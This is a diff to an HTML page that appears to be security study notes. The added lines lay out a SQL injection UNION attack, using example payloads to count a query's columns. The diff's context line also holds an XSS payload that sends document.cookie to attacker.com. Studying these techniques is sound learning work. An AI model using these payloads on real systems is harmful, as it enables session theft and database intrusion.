@@ -458,6 +458,16 @@ fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie)
                 </div>
                 <div class="card">
                     <h3>Union Attack</h3>
+                    <p>Methdology: </p>
+                    <ul class="indented-list">
+                        <li>Step 1: Identify How Many Columns</li>
+                        <ul class="indented-list">
+                            <li><code>' UNION  SELECT NULL --</code> *Page breaks* </li>
+                            <li><code>' UNION  SELECT NULL,NULL --</code> *Page breaks* </li>
+                            <li><code>' UNION  SELECT NULL,NULL,NULL --</code> *Page works! We know its 3 columns* </li>
+                        </ul>
+                        
+                    </ul>
                 </div>
                 <div class="card">
                     <h3 class="card-title">Error-Based Detection</h3>
